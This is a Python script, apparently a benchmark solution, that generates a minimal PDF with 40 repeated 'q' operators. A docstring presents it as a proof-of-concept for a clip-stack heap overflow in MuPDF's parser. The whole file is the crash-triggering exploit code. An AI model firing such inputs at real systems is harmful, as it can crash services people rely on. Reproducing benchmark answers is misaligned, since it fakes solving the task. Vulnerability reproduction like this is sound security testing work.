class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability exists in MuPDF's PDF parser. Specifically, in the
        `pdf_process_gsave` function (and others), which handles the 'q'
        (gsave) PDF operator. This function pushes the current graphics state,
        including the clipping path, onto a stack (`gstate->clip_stack`).

        The `clip_stack` is a fixed-size array of 32 elements within the
        `pdf_gstate` struct. Before the fix, the code did not check if the
        stack was full before pushing a new element. The push operation is:
        `gstate->clip_stack[gstate->clip_depth] = ...;`
        followed by:
        `gstate->clip_depth++;`

        If the 'q' operator is called 33 times, `gstate->clip_depth` will be 32
        on the 33rd call, leading to a write to `gstate->clip_stack[32]`, which
        is one element past the end of the buffer. This heap buffer overflow
        corrupts adjacent members of the `pdf_gstate` struct on the heap.

        This PoC constructs a minimal PDF file containing a content stream with
        the 'q' operator repeated 40 times. This ensures a multi-word
        overwrite, making a crash highly likely when the corrupted data is
        subsequently used, while keeping the PoC size extremely small for a high
        score.
        """
        # The 'q' operator in PDF saves the graphics state. Repeating it
        # overflows the graphics state stack. The stack size is 32.
        # We use 40 repetitions to ensure a significant overwrite.
        payload = b'q ' * 40

        # We construct a minimal, valid PDF file.
        # It consists of a header, a body with object definitions,
        # a cross-reference table (xref), and a trailer.

        # List to hold the parts of the PDF body.
        body_parts = []
        # Dictionary to store the byte offset of each object.
        offsets = {}

        # The PDF header.
        body_parts.append(b"%PDF-1.7\n")

        # Object 1: The document catalog.
        offsets[1] = len(b"".join(body_parts))
        body_parts.append(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")

        # Object 2: The pages tree root.
        offsets[2] = len(b"".join(body_parts))
        body_parts.append(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")

        # Object 3: The single page object. It refers to the content stream (object 4).
        offsets[3] = len(b"".join(body_parts))
        body_parts.append(b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n")

        # Object 4: The content stream containing the malicious payload.
        stream = b"<< /Length %d >>\nstream\n%s\nendstream" % (len(payload), payload)
        offsets[4] = len(b"".join(body_parts))
        body_parts.append(b"4 0 obj\n" + stream + b"\nendobj\n")

        # Join the body parts and calculate the offset for the xref table.
        body = b"".join(body_parts)
        xref_offset = len(body)

        # Create the xref table.
        xref_parts = [b"xref\n", b"0 5\n", b"0000000000 65535 f \n"]
        for i in range(1, 5):
            xref_parts.append(b"%010d 00000 n \n" % offsets[i])
        xref = b"".join(xref_parts)

        # Create the trailer.
        trailer = (
            b"trailer\n"
            b"<< /Size 5 /Root 1 0 R >>\n"
            b"startxref\n"
            b"%d\n" % xref_offset +
            b"%%EOF"
        )

        return body + xref + trailer
